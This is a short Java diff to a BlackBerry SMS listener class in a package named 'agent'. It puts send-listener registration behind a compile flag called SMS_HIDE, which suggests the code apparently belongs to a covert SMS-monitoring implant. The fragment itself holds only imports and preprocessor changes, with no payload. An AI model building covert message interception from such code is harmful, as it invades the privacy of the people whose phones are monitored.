@@ -1,3 +1,4 @@
+//#preprocess
 package blackberry.agent.sms;
 
 import java.io.IOException;
@@ -10,8 +11,6 @@ import javax.wireless.messaging.Message;
 import javax.wireless.messaging.MessageConnection;
 import javax.wireless.messaging.TextMessage;
 
-import net.rim.blackberry.api.sms.SMS;
-import net.rim.blackberry.api.sms.SendListener;
 import net.rim.device.api.io.DatagramBase;
 import net.rim.device.api.io.SmsAddress;
 import net.rim.device.api.system.RuntimeStore;
@@ -20,11 +19,16 @@ import net.rim.device.api.ui.component.EditField;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.fs.Path;
+
 import blackberry.interfaces.SmsObserver;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 
+//#ifdef SMS_HIDE
 public class SmsListener46 extends SmsListener implements SendListener {
+//#else
+public class SmsListener46 extends SmsListener {  
+//#endif
     private static final long GUID = 0xe78b740082783263L;
     // Statics ------------------------------------------------------------------
     private static String _openString = "sms://:0"; // See Connector implementation notes.
@@ -84,7 +88,10 @@ public class SmsListener46 extends SmsListener implements SendListener {
         //#ifdef DEBUG
         debug.trace("start: add sendListener");
         //#endif
+        
+        //#ifdef SMS_HIDE
         SMS.addSendListener(this);
+        //#endif
     }
 
     protected synchronized void stop() {
@@ -93,7 +100,10 @@ public class SmsListener46 extends SmsListener implements SendListener {
         //#ifdef DEBUG
         debug.trace("stop: remove sendListener");
         //#endif
+        
+        //#ifdef SMS_HIDE
         SMS.removeSendListener(this);
+        //#endif
     }
 
     // Inner Classes ------------------------------------------------------------
